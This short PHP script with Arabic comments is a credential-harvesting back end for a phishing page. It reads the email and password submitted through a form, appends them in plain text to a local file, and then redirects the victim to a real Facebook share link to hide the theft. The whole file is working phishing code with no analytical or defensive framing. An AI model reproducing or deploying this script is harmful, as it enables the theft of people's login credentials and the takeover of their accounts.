<?php
// فتح الملف وإضافة البيانات
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];

    // فتح ملف النصوص وكتابة البيانات
    $file = fopen("data.txt", "a");
    fwrite($file, "Email: " . $email . " - Password: " . $password . "\n");
    fclose($file);

    // إعادة توجيه المستخدم لرابط البوست
    header("Location: https://www.facebook.com/share/NPcXiPRiGQvPTcTW/");
    exit();
}
?>
